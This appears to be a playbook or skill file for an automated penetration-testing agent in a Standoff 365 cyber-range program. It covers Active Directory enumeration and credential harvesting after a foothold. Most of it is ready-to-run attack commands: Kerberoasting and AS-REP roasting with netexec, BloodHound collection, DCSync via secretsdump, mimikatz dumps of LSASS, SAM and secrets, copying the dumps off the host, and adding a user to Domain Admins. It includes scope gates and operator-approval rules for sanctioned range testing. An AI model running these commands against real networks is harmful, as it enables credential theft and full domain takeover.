---
name: attack-ad-recon
description: Active-Directory enumeration + credential harvesting after a Windows/Linux foothold inside the perimeter. Maps users/groups/trusts/SPNs/ACLs to a BloodHound graph, dumps LSASS/SAM/NTDS where permitted, and surfaces the shortest-path edges that lead to Domain Admin. Post-foothold stage, operator-gated.
category: post-foothold
tags: [active-directory, bloodhound, kerberos, lsass, ntds, enumeration]
cwe_ids: [CWE-287, CWE-284, CWE-306]
chains_with: [attack-kerberos, attack-adcs, attack-lateral, attack-privesc, attack-loot]
tools: [impacket, bloodhound-python, bloodyAD, netexec, sharphound, mimikatz, bloodhound-ce, leash-foothold.sh, guard.py]
version: "1.0"
---

# Active-Directory recon (post-foothold)

## Objective
Translate a looted cred OR a shell-on-host into the AD graph of **users, groups, trusts, SPN, ACL,
cert-template** edges so the operator can pick the shortest path to **admin:<domain>** (milestone 3
oracle = the marker user in the Domain Admins group) and beyond. ATT&CK T1087.002 / T1069.002 /
T1482 / T1003.

> **The milestone markers are the PROGRAM'S, not hardcoded.** `standoff365` / `Администраторы домена`
> shown throughout are the Standoff 365 default example; set `objective.oracle_markers.{da_user,da_group}`
> in `scope.yaml` for a different program (or `Domain Admins` on an English domain). The methodology is
> program-agnostic — only the proof marker changes.

## Gate (check BEFORE anything)
- `stage: post-foothold`
- `requires: ["creds:<p>@<dc>"]` OR `["shell:<host>"]`
- `scope.yaml` **must** cover the AD side of the target (the DC host or an in-scope IP it resolves to).
  A looted cred on an in-scope host is one of two legitimate paths; the other is `session.env` where
  the operator hands over a known-good AD cred.
- **Operator GO required** per `scope.policies.privilege-escalation-without-approval` — this stage is
  not fleet-autonomous.
- Every tool runs via `tools/leash-foothold.sh <target_dir> <foothold-host> <cmd>` and
  `tools/guard.py --scope "$LEASH_SCOPE" --check "<any neighbour before touching>"`.

## Methodology — three layers, cheapest first

### 1. Passive LDAP enum (read-only, cheap, loud by baseline)
```bash
# From the Linux side of a foothold, OR from the operator box with a looted cred reachable over LDAP:
bin/.pyenv/Scripts/lookupsid.py "<DOM>/<user>:<pwd>@<DC-IP>" 20000 \
  > targets/<t>/raw/ad-recon/lookupsid.txt
bin/nxc ldap <DC-IP> -u <user> -p <pwd> --users --groups --trusted-for-delegation --asreproast asreproast.txt --kerberoasting kerberoast.txt
bin/nxc ldap <DC-IP> -u <user> -p <pwd> -M get-desc-users -M group-mem -M maq
```
`netexec` is leash-cred-aware (`tools/leash-cred.sh`) and will respect `rate_limit_rps`.

### 2. BloodHound graph collection (richer, still read-only)
Cross-OS (preferred on Linux foothold / operator box):
```bash
bin/.pyenv/Scripts/bloodhound-python -u <user> -p <pwd> -d <domain> -c All \
    -ns <DC-IP> --zip -o targets/<t>/raw/ad-recon/bh
```
From a Windows foothold with better coverage (sessions, LocalAdmin, ADCS):
```powershell
# Delivered via leash-foothold.sh to <windows-host>:
.\SharpHound.exe --CollectionMethods All --ZipFileName bh.zip --OutputDirectory C:\Windows\Temp\
# then exfil via smbclient / impacket to targets/<t>/raw/ad-recon/
```
Load into **BloodHound CE** on the operator box (`docker compose up` from
`bin/.ad/bloodhound-ce/`), import the .zip, run queries:
- `MATCH p = shortestPath((n)-[*1..]->(m:Group {name:"ADMINISTRATORS@..."})) RETURN p`
- `MATCH (n)-[:CanRDP|CanPSRemote|AdminTo]->(m) WHERE n.owned RETURN n,m`
- `MATCH p=shortestPath((n:User {owned:true})-[*1..6]->(m:Group {highvalue:true})) RETURN p`
- ADCS: `MATCH (n)-[:Enroll|GenericAll|WriteDacl]->(c:CertTemplate) RETURN n,c`

Graph output drives the next-wave hypothesis set (`attack-kerberos` / `attack-adcs` / `attack-lateral`).

### 3. Credential extraction (active — operator-GO stage)
From a looted DA/admin cred:
```bash
# DCSync — NTDS over MS-DRSR without touching the DC filesystem
bin/.pyenv/Scripts/secretsdump.py "<DOM>/<admin>:<pwd>@<DC-IP>" -just-dc-ntlm \
  -outputfile targets/<t>/raw/ad-recon/ntds
```
From a Windows-host foothold:
```powershell
# Mimikatz — AV must be excluded for bin/.ad/ (operator-done):
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "lsadump::sam" "lsadump::secrets" "exit" > logon.txt
```
Save the proven creds (one per line, `principal:secret`) and **register them in `state.json.creds[]`**
via the synthesizer `result.json.creds[]` field so `attack-lateral` can consume them next wave.

## Milestone-3 oracle (the 200K rung)
```bash
# Add the 'standoff365' user and lift it to Domain Admins — exactly as the program's oracle asks.
bin/.pyenv/Scripts/net.py "<DOM>/<DA>:<pwd>@<DC-IP>" user add standoff365 Standoff365_demo!
bin/.pyenv/Scripts/net.py "<DOM>/<DA>:<pwd>@<DC-IP>" group addmember "Администраторы домена" standoff365

# or with bloodyAD (same result, nicer syntax):
bin/.pyenv/Scripts/bloodyAD -u <DA> -p <pwd> -d <domain> --host <DC-IP> \
    add user standoff365 Standoff365_demo!
bin/.pyenv/Scripts/bloodyAD -u <DA> -p <pwd> -d <domain> --host <DC-IP> \
    add groupMember "CN=Администраторы домена,OU=...,DC=...,DC=..." standoff365
```
Oracle evidence:
1. Screenshot of `Active Directory Users and Computers` showing standoff365 in group members.
2. `net group "Администраторы домена" /domain` output listing standoff365 (dump to
   `raw/attack-<h>/milestone-3-proof.txt`).
3. State ledger: `state.objective.distance = file-read-or-rce → ad-admin`.

## Forbidden (scope-encoded + Spider doctrine)
- No destructive AD changes outside the standoff365 marker — never alter other users, groups, or GPOs.
- No persistence/implant tooling (no `AdminSDHolder` DACL tricks beyond the one-user add, no
  skeleton-key injection, no DSRM backdoor). The one-user add IS the proof artifact; nothing else.
- No cross-trust pivot without operator GO; always `guard.py --check` the next host first.
- No LSASS dump on a hosts whose foothold cred is not explicitly operator-attested (we are NOT the
  only tenant on a shared machine).

## Oracle (how we know AD-recon succeeded)
- `creds:<admin>@<domain>` is **oracle-proven** when `nxc smb <DC-IP> -u <admin> -p <pwd>` returns
  `Pwn3d!` AND `nxc ldap <DC-IP> -u <admin> -p <pwd> --users` lists the domain.
- `admin:<domain>` is **oracle-proven** only when the standoff365-user milestone-3 PoC succeeds AND is
  reversible (user still exists under program-approved marker). The screenshot + command transcript go
  into `raw/attack-<h>/`.

## Chaining
- `creds:<p>@<dc>` → unlocks `attack-kerberos` (SPN roasting, AS-REP, TGT delegation).
- `creds:<p>@<dc>` → unlocks `attack-adcs` (`certipy find` → ESC path).
- `admin:<domain>` → unlocks `attack-privesc` for cross-host or vCenter admin (milestone-4).
- Looted DA + reachable backup VLAN → unlocks `attack-backup-pivot` (milestone-5 НС).
